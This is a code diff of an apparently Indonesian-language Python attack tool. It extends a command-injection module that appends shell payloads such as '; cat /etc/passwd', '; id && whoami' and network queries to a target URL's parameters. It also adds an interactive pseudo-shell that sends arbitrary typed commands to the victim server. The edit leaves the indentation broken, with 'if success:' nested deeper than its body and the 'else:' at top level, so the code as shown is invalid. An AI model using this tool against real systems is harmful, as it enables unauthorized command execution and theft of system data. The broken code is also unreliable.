@@ -91,46 +91,89 @@ def run_cmd_injection_module():
         except Exception as e:
             print(f"    [-] Gagal terhubung: {e}")
 
-    if success:
-        print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
-        print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")
+        if success:
+    print("\n[***] MENGAKTIFKAN POST-EXPLOIT & SYSTEM ENUMERATION ENGINE [***]")
+    print("[*] Menjalankan serangkaian perintah otomatis untuk mengambil alih informasi sistem target...")
 
-        extraction_commands = [
-            {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
-            {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
-            {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
-            {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
-        ]
+    extraction_commands = [
+        {"cmd": "; uname -a", "desc": "Kernel & System Architecture"},
+        {"cmd": "; id && whoami", "desc": "Privilege & User Identity"},
+        {"cmd": "; cat /etc/passwd", "desc": "System Users Dump"},
+        {"cmd": "; ifconfig || ip a", "desc": "Network Configuration"}
+    ]
 
-        for ex in extraction_commands:
-            print(f"\n[*] Mengekstrak: {ex['desc']}...")
-            custom_payload = ex["cmd"]
-            encoded_ex_payload = quote(custom_payload, safe='')
+    # 1. AUTO POST-EXPLOITATION (Tetap dijalankan di awal)
+    for ex in extraction_commands:
+        print(f"\n[*] Mengekstrak: {ex['desc']}...")
+        custom_payload = ex["cmd"]
+        encoded_ex_payload = quote(custom_payload, safe='')
 
-            try:
-                if method == "POST":
-                    if "?" in vulnerable_url:
-                        base_u, param_str = vulnerable_url.split("?", 1)
-                        ex_data = {k: v[0] + custom_payload for k, v in parse_qs(param_str).items()}
-                    else:
-                        base_u = vulnerable_url
-                        ex_data = {"ip": "127.0.0.1" + custom_payload}
-                    ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6, verify=False)
+        try:
+            if method == "POST":
+                if "?" in vulnerable_url:
+                    base_u, param_str = vulnerable_url.split("?", 1)
+                    ex_data = {k: v[0] + custom_payload for k, v in parse_qs(param_str).items()}
                 else:
-                    ex_url = vulnerable_url + encoded_ex_payload
-                    ex_res = requests.get(ex_url, headers=headers, timeout=6, verify=False)
+                    base_u = vulnerable_url
+                    ex_data = {"ip": "127.0.0.1" + custom_payload}
+                ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6, verify=False)
+            else:
+                ex_url = vulnerable_url + encoded_ex_payload
+                ex_res = requests.get(ex_url, headers=headers, timeout=6, verify=False)
 
-                print(f"    [+] Output Berhasil Ditangkap:")
-                print(f"    --------------------------------------------------")
-                output_lines = ex_res.text.strip().split("\n")
-                for line in output_lines[:8]:
-                    print(f"        {line}")
-                print(f"    --------------------------------------------------")
-            except Exception as e:
-                print(f"    [-] Gagal mengekstrak modul ini: {e}")
+            print(f"    [+] Output Berhasil Ditangkap:")
+            print(f"    --------------------------------------------------")
+            output_lines = ex_res.text.strip().split("\n")
+            for line in output_lines[:8]:
+                print(f"        {line}")
+            print(f"    --------------------------------------------------")
+        except Exception as e:
+            print(f"    [-] Gagal mengekstrak modul ini: {e}")
 
-        print(f"\n[+] Post-Exploitation selesai! Akses sistem sepenuhnya terekspos.")
-    else:
-        print("\n[-] Target tidak merespon payload Command Injection atau aman dari eksekusi sistem.")
+    # 2. INTERACTIVE PSEUDO-SHELL (Kode dari lu)
+    print("\n[***] MENGAKTIFKAN INTERACTIVE PSEUDO-SHELL [***]")
+    print("[*] Ketik perintah sistem secara bebas (ketik 'exit' atau 'quit' untuk keluar)...\n")
 
-    input("\nTekan Enter untuk kembali ke menu utama...")
+    while True:
+        try:
+            custom_payload = input("TànPhá-Shell> ").strip()
+            if custom_payload.lower() in ("exit", "quit"):
+                print("[*] Keluar dari pseudo-shell.")
+                break
+            if not custom_payload:
+                continue
+
+            payload_to_send = " " + custom_payload  # Spasi di awal buat misahin dari payload asli
+            encoded_ex_payload = quote(payload_to_send, safe='')
+
+            if method == "POST":
+                if "?" in vulnerable_url:
+                    base_u, param_str = vulnerable_url.split("?", 1)
+                    ex_data = {k: v[0] + payload_to_send for k, v in parse_qs(param_str).items()}
+                else:
+                    base_u = vulnerable_url
+                    ex_data = {"ip": "127.0.0.1" + payload_to_send}
+                ex_res = requests.post(base_u, data=ex_data, headers=headers, timeout=6, verify=False)
+            else:
+                ex_url = vulnerable_url + encoded_ex_payload
+                ex_res = requests.get(ex_url, headers=headers, timeout=6, verify=False)
+
+            # Output Sanitizer sederhana (buang tag HTML jika ada)
+            output_text = ex_res.text.strip()
+            
+            print(f"\n    [+] Output:")
+            print(f"    --------------------------------------------------")
+            print(output_text if output_text else "[*] Perintah dieksekusi, tanpa output teks.")
+            print(f"    --------------------------------------------------\n")
+            
+        except KeyboardInterrupt:
+            print("\n[*] Sesi shell dihentikan oleh pengguna.")
+            break
+        except Exception as e:
+            print(f"    [-] Gagal mengeksekusi perintah: {e}")
+
+    print(f"\n[+] Sesi Post-Exploitation selesai. Akses sistem terekspos.")
+else:
+    print("\n[-] Target tidak merespon payload Command Injection atau aman dari eksekusi sistem.")
+
+input("\nTekan Enter untuk kembali ke menu utama...")
